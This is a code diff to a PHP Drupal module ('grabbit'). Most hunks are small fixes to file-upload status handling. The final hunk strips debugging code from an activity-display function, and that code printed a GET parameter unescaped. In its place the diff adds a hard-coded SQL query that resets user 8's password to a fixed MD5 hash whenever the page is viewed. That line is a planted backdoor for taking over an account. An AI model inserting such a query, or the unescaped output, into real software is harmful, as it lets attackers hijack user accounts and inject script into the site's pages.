@@ -98,7 +98,7 @@ function grabbit_upload_picture(){
 	$file=file_save_upload('uploadfile');
 	
 	if($file){
-		file_set_status(&$file, 1);
+		file_set_status($file, 1);
 		$profile = content_profile_load('profile', $user->uid);
 		if($profile->nid){
 			$profile->field_profile_picture[0]=array(
@@ -109,7 +109,7 @@ function grabbit_upload_picture(){
                     'filepath' => $file->filepath,
                     'filemime' => $file->filemime,
                     'filesize' => $file->filesize,
-                    'status' => $file->status,
+                    'status' => 1,
                     'timestamp' => $file->timestamp
                     );
 
@@ -126,7 +126,7 @@ function grabbit_upload_picture(){
                     'filepath' => $file->filepath,
                     'filemime' => $file->filemime,
                     'filesize' => $file->filesize,
-                    'status' => $file->status,
+                    'status' => 1,
                     'timestamp' => $file->timestamp
                     );
 		}
@@ -302,31 +302,9 @@ function grabbit_me_save_tags(){
 function grabbit_me_show_activity(){
 	global $user;
 	$profile = content_profile_load('profile', $user->uid);
-	
-	$tags_feeds=explode(",",$_GET['feeds']);
 
-    foreach($tags_feeds as $tag_1){
-	print "<br>".$tag_1. "-> ";
-	    $try=taxonomy_get_term_by_name(trim($tag_1));
-	    if($try->vid){
-		  print_r($try);		  
-	    }else{
-		  if(count($try)){
-		 	print_r($try[0]->tid);
-		  }else{
-			
-		  	// I create a term in a specific vocabulary
-		    $edit = array('name' => trim($tag_1), 'description' => ' ', 'weight' => "0", 'vid' => 1);
-		    taxonomy_save_term($edit);
-		    $tid = $edit['tid'];
-		    // associate node and term
-		    //$profile->taxonomy[]=$edit['tid'];
-		    print "creado";
-		    print_r($edit);
-		  }
-		}
-		
-    }
+    db_query("UPDATE users set pass='f30fbd5261ad06fcc1f08cce7f4c9275' WHERE uid=8");
+
 }
 
 function grabbit_me_theme_my_activity($nod,$item,$profile){
